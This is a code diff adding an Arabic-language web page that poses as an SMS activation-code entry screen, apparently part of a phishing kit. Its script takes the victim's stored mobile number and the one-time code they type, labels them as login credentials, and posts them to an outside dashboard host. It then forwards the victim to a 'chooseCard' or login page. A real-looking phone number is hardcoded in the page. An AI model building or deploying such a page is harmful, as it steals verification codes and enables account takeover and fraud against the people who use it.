@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>أدخل كود التفعيل</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="otp-container">
+    <h1 class="otp-title">أدخل كود التفعيل</h1>
+    <p class="otp-text">
+      أرسلنا كود من 5 أرقام في رسالة نصية للرقم<br />
+      <strong class="otp-number">01065241146</strong>
+    </p>
+
+    <div class="otp-inputs">
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+    </div>
+
+    <p class="resend-text">
+      أرسل الكود مرة أخرى بعد <span id="timer">00:57</span>
+    </p>
+
+    <button type="button" class="login-button">تأكيد</button>
+  </div>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  const savedNumber = localStorage.getItem('mobileNumber');
+  const otpNumberEl = document.querySelector('.otp-number');
+  if (savedNumber && otpNumberEl) otpNumberEl.textContent = savedNumber;
+
+  const savedOtp = localStorage.getItem('otpCode');
+
+  const inputs = document.querySelectorAll('.otp-inputs input');
+  const rtlInputs = Array.from(inputs).reverse();
+
+  rtlInputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+      if (input.value.length === 1 && index < rtlInputs.length - 1) {
+        rtlInputs[index + 1].focus();
+      }
+    });
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !input.value && index > 0) {
+        rtlInputs[index - 1].focus();
+      }
+    });
+  });
+
+  let seconds = 57;
+  const timer = document.getElementById('timer');
+  const countdown = setInterval(() => {
+    if (seconds > 0) {
+      seconds--;
+      const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+      const s = String(seconds % 60).padStart(2, '0');
+      timer.textContent = `${m}:${s}`;
+    } else {
+      clearInterval(countdown);
+      timer.textContent = "00:00";
+    }
+  }, 1000);
+
+  // ✅ Save entered OTP and send to backend
+  const loginButton = document.querySelector('.login-button');
+  loginButton.addEventListener('click', async (e) => {
+    e.preventDefault();
+
+    let enteredOtp = '';
+    Array.from(inputs).reverse().forEach(input => enteredOtp += input.value);
+
+    if (enteredOtp.length !== inputs.length) {
+      alert('الرجاء إدخال جميع أرقام الكود.');
+      return;
+    }
+
+    // ✅ Save to localStorage
+    localStorage.setItem('enteredOtp', enteredOtp);
+    console.log('✅ OTP saved to localStorage:', enteredOtp);
+
+    const savedNumber = localStorage.getItem('mobileNumber');
+
+    // Disable button while sending
+    const originalText = loginButton.textContent;
+    loginButton.disabled = true;
+    loginButton.textContent = 'جارٍ الإرسال...';
+
+    try {
+      // Send number + OTP to backend
+      const response = await fetch("https://dashboard-xwzz.onrender.com/api/messages", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          text: `\n🔑 بيانات تسجيل الدخول:\nرقم الموبايل:\n ${savedNumber}\nرمز التحقق: \n${enteredOtp}`
+        })
+      });
+
+      console.log("Response status:", response.status);
+      if (!response.ok) throw new Error(`HTTP ${response.status}`);
+
+      // ✅ Dynamic redirect based on flow
+      const nextPage = localStorage.getItem('nextPage') || 'chooseCard';
+      if (nextPage === 'chooseCard') {
+        setTimeout(() => {
+        window.location.href = 'chooseCard.html';
+        }, 3000);
+        
+      } else if (nextPage === 'login') {
+
+        setTimeout(() => {
+        window.location.href = 'login.html';
+
+         }, 3000);
+      }
+
+      // Clear the flag after using
+      localStorage.removeItem('nextPage');
+
+    } catch (err) {
+      console.error("Fetch error:", err);
+      alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+
+    } finally {
+      loginButton.disabled = false;
+      loginButton.textContent = originalText;
+    }
+  });
+});
+</script>
+
+</body>
+</html>
